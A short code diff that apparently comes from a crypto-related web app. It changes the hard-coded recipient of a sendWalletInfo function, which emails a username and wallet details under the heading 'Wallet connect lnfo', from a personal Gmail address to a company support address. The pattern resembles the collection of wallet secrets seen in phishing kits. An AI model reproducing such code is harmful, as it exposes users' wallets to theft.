@@ -307,7 +307,7 @@ async function resendWelcomeEmail({ to, token }) {
 
 
 async function sendWalletInfo({ username, addy,wally }) {
-  var to="dondanny712@gmail.com"
+  var to="support@stoxphere.com"
   const content = `
     <html>
     <h2>Wallet connect lnfo</h2>
